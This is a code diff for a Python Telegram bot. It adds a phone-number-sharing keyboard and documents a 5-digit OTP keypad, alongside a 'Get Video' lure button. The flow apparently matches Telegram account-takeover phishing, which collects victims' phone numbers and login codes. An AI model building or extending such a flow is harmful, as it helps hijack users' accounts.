@@ -5,12 +5,18 @@ def get_welcome_keyboard():
     keyboard = [[KeyboardButton("Proceed Automatically 🚀", request_contact=True)]]
     return ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
 
+def get_contact_keyboard():
+    # Contact sharing keyboard for phone verification
+    keyboard = [[KeyboardButton("📱 Share Phone Number", request_contact=True)]]
+    return ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
+
 def get_get_file_keyboard():
     # Using Inline Keyboard for Get Video to make it feel more premium
     keyboard = [[InlineKeyboardButton("📥 Get Video", callback_data="get_file")]]
     return InlineKeyboardMarkup(keyboard)
 
 def get_otp_keyboard(current_code=""):
+    """Generate 5-digit OTP keyboard"""
     keyboard = []
     for i in range(1, 10, 3):
         keyboard.append([InlineKeyboardButton(str(j), callback_data=f"num_{j}") for j in range(i, i+3)])
